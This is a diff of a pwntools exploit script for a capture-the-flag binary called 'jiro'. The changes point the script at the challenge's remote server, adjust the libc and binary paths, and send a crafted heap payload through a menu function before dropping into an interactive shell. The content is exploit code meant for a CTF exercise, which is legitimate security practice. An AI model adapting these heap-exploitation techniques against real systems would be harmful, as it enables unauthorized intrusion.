@@ -2,12 +2,13 @@
 
 from pwn import *
 from time import sleep
-context.binary = binary = ELF("./jiro", checksec=False)
+context.binary = binary = ELF("./app/jiro", checksec=False)
 context.log_level = "debug"
 context.terminal = ['gnome-terminal', '-e']
+libc = ELF('./app/libc.so.6', checksec=False)
 
-p = process()
-#p = remote("server_ip", port)
+# p = process()
+p = remote("ctfd.cybpaws.su", 11777)
 
 def debug(p):
     pid = util.proc.pidof(p)[0]
@@ -27,7 +28,6 @@ def demangle(val, is_heap_base=False):
         return val
     return val << 12
 
-libc = ELF('./libc.so.6', checksec=False)
 
 def hire(name, role=1):
     p.sendlineafter(b'>> ', b'1')
@@ -162,6 +162,7 @@ payload = flat([
 
 hire(p64(0) + p64(0) + p64(1) + p64(0) * 2 + p64(1) + p64(4) + payload +p64(0)).decode()
 
+sleep(3)
 p.sendline(b'8')
 
 p.interactive()
